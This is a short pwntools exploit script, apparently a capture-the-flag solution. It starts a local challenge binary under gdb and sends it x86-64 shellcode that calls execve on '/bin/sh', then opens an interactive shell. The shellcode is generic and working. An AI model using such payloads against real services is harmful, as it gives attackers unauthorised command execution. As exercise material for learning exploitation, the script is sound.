from pwn import *
from libdebug import *

#def sig(t, c):
    #print("COUGHT")

c = process("./benchmarking_service")
gdb.attach(c, """c""")

#d.catch_signal("SIGALRM", callback = sig)
#d.signals_to_block = ["SIGALRM"]


payload = b"\x48\x89\xC7\x48\x83\xC7\x13\x48\x31\xC0\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\0"
c.send(payload)

c.interactive()